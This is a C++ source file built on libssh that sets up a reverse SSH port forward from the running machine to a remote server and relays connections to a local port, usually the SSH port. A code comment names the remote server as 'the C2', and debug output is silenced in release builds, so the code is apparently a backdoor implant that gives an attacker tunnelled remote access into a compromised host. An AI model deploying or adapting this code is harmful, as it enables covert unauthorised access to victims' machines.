#define LIBSSH_STATIC 1

#include <libssh/libssh.h>
#include <libssh/server.h>

#include <stdio.h>
#include <thread>

#include "client.h"

#ifdef _WIN32
#include <Ws2tcpip.h>
#define close closesocket
#else
#include <arpa/inet.h>
#endif // _WIN32

#ifdef IS_DEBUG
#define debug printf
#else  // just doesn't print the printf
#define debug(MESSAGE, ...)
#endif

int SSHClient::should_terminate = 0;

SSHClient::SSHClient()
{
}

int SSHClient::connect_to_local_service(int port)
{
    int sockfd = 0;

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        debug("inet_pton\n");
        return -1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        debug("socket\n");
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
        0) {
        debug("connect\n");
        return -1;
    }

    return sockfd;
}



int SSHClient::do_remote_forwarding_loop(ssh_session session,
    ssh_channel channel, int lport)
{
    /* Connect to the service */
    int sockfd;

    int rc;
    debug("[OTCP] Connecting to localhost:%d...", lport);
    rc = connect_to_local_service(lport);
    if (rc == -1) {
        debug("failed\n");
        return SERVICE_CONN_ERROR;
    }
    debug("done\n");

    sockfd = rc;

#ifdef _WIN32
    u_long iMode = 1;
    ioctlsocket(sockfd, FIONBIO, &iMode);
#endif // _WIN32

    int nbytes = 0, nwritten = 0;

#define BUF_SIZE 4096
    char *buffer = (char*)malloc(BUF_SIZE);
    if (!buffer) {
        debug("[DEBUG] malloc\n");
        return SYSTEM_ERROR;
    }
#ifdef _WIN32
#define EVENTS POLLIN 
#else
#define EVENTS (POLLIN | POLLPRI)

#endif // _WIN32
    int ssh_fd = ssh_get_fd(session);
    struct pollfd fds[2];
    fds[0].fd = ssh_fd;
    fds[0].events = EVENTS;
    fds[1].fd = sockfd;
    fds[1].events = EVENTS;

    while (!should_terminate) {
#ifdef _WIN32
        rc = WSAPoll(fds, 2, -1);
        auto a = WSAGetLastError();
#else
        rc = poll(fds, 2, -1);
#endif // _WIN32  
        if (rc == -1) {
            free(buffer);
            close(sockfd);
            return SYSTEM_ERROR;
        }

        if (fds[0].revents & POLLIN) {
            nbytes =
                ssh_channel_read_nonblocking(channel, buffer,
                    BUF_SIZE, 0);
            if (nbytes == 0) {
                if (ssh_channel_is_eof(channel) ||
                    !ssh_channel_is_open(channel)) {
                    free(buffer);
                    close(sockfd);
                    return SSH_SENT_EOF;
                }
            }
            if (nbytes == SSH_ERROR) {
                debug("[DEBUG] ssh_channel_read_nonblocking: %s\n",
                    ssh_get_error(session));
                free(buffer);
                close(sockfd);
                return SSH_ERROR;
            }
            if (nbytes > 0) {
                debug
                ("[DEBUG] Read %d bytes from SSH tunnel\n",
                    nbytes);

                /* Write to service */
                int tot_sent = 0;
                while (tot_sent < nbytes) {
#ifdef _WIN32
                    nwritten = send(sockfd,
                        buffer + tot_sent,
                        nbytes - tot_sent,
                        0);
#else
                    nwritten = send(sockfd,
                        buffer + tot_sent,
                        nbytes - tot_sent,
                        MSG_DONTWAIT);
#endif // _WIN32

                    if (nwritten < 0) {
                        if (errno != EAGAIN
                            && errno != EWOULDBLOCK) {
                            free(buffer);
                            close(sockfd);
                            return
                                SERVICE_CONN_ERROR;
                        }
                    }
                    else {
                        tot_sent += nwritten;
                        debug
                        ("[DEBUG] Sent %d bytes to service\n",
                            nwritten);
                    }
                }
            }
            else {
                /* Assume client has closed connection
                   to rport on remote side */
                free(buffer);
                close(sockfd);
                return CLIENT_SENT_EOF;
            }
        }

        if (fds[1].revents & POLLIN) {
#ifdef _WIN32
            nbytes = recv(sockfd, buffer, BUF_SIZE, 0);
#else
            nbytes = recv(sockfd, buffer, BUF_SIZE, MSG_DONTWAIT);
#endif // _WIN32      
            if (nbytes < 0) {
                if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    char err[10];
                    strerror_s(err, 10, errno);
                    debug("recv: %s\n", err);
                    free(buffer);
                    close(sockfd);
                    return SERVICE_CONN_ERROR;
                }
            }
            else if (nbytes == 0) {
                debug("recv: EOF\n");
                free(buffer);
                close(sockfd);
                return SERVICE_SENT_EOF;
            }
            debug("[DEBUG] Read %d bytes from service\n", nbytes);

            int tot_sent = 0;
            while (tot_sent < nbytes) {
                nwritten = ssh_channel_write(channel,
                    buffer + tot_sent,
                    nbytes - tot_sent);
                if (nwritten == SSH_ERROR) {
                    debug("ssh_channel_write: %s\n",
                        ssh_get_error(session));
                    free(buffer);
                    close(sockfd);
                    return SSH_ERROR;
                }
                else {
                    tot_sent += nwritten;
                    debug
                    ("[DEBUG] Sent %d bytes to SSH tunnel\n",
                        nwritten);
                }
            }
        }
    }
    return SSH_OK;
}

void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport) {
	auto rc = do_remote_forwarding_loop(sess, chan, lport);
	if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR) {
		debug("[OTCP] Terminate SSH channel\n");
		ssh_channel_send_eof(chan);
		ssh_channel_free(chan);
		/*ssh_disconnect(sess);
		ssh_free(sess);*/
		return ;
	}
	else {
		/* The service has either sent EOF
		   or an error condition occurred, but
		   the tunnel is still open.
		   Accept a new connection. */
		debug("[DEBUG] Service disconnected\n");
		ssh_channel_send_eof(chan);
		debug("[DEBUG] Sent SSH EOF\n");
		ssh_channel_free(chan);
		debug("[DEBUG] Freed channel\n");
		return;
	}
}


/* OpenSSH command equivalent:
 * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
 *
 * lport:   port to forward to once tunnel established  // usually 22 for us 2222
 * rport:   port the ssh server will be listening on    // we will do in the C2: ssh localhost -p [rport]
 */
int SSHClient::do_remote_forwarding(ssh_session sess, int lport, int rport)
{
    debug("[OTCP] Opening port T:%d on server...\n", lport);
    int bounded_port = 0;
    int nbytes, nwritten;
    char buffer[256];
#ifdef IS_DEBUG
	int remote_liste_port = 1234;
#else
	int remote_liste_port = NULL;
#endif
    auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", remote_liste_port, &bounded_port);
    if (rc != SSH_OK) {
        debug("failed: %s\n", ssh_get_error(sess));
        ssh_disconnect(sess);
        ssh_free(sess);
        return -1;
    }
    debug("Check port %d in remote server\n", bounded_port?bounded_port:remote_liste_port);

	ssh_channel chan;
    while (!should_terminate) {
        int dport = 0;	// The port bound on the server, here: 8080
        debug("[OTCP] Waiting for incoming connection...");
        fflush(stdout);

        chan = ssh_channel_accept_forward(sess,
            ACCEPT_FORWARD_TIMEOUT,
            &dport);
        if (chan == NULL) {
            if (ssh_get_error_code(sess) != 0) {	/* Timed out */
                debug("failed: %s\n",
                    ssh_get_error(sess));
                ssh_disconnect(sess);
                ssh_free(sess);
                return -1;
            }
            else {
                continue;
            }
        }
        debug("\n[OTCP] Connection received\n");
		//std::thread(SSHClient::remote_forwading_thread, sess, chan, lport).detach();
		SSHClient::remote_forwading_thread(sess, chan, lport);
        
    }

    ssh_disconnect(sess);
    ssh_free(sess);
    return 1;
}


int SSHClient::run(const char* username, const char* host, int port)
{
    ssh_session my_ssh_session;
#ifdef IS_DEBUG
    int verbosity = SSH_LOG_FUNCTIONS;
#else
    int verbosity = SSH_LOG_NOLOG;
#endif // DEBUG


    int rc;


    // Open session and set options
    my_ssh_session = ssh_new();
    if (my_ssh_session == NULL)
        exit(-1);
    auto a = ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT_STR, "22");

    // Connect to server
    rc = ssh_connect(my_ssh_session);
    if (rc != SSH_OK)
    {
        debug("Error connecting to %s: %s\n",
            host,
            ssh_get_error(my_ssh_session));
        ssh_free(my_ssh_session);
        exit(-1);
    }

    rc = ssh_userauth_none(my_ssh_session, username);
    if (rc != SSH_AUTH_SUCCESS)
    {
        debug("Error authenticating with password: %s\n",
            ssh_get_error(my_ssh_session));
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        exit(-1);
    }


    // do something
    do_remote_forwarding(my_ssh_session, port, 1234);

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    

    return 0;
}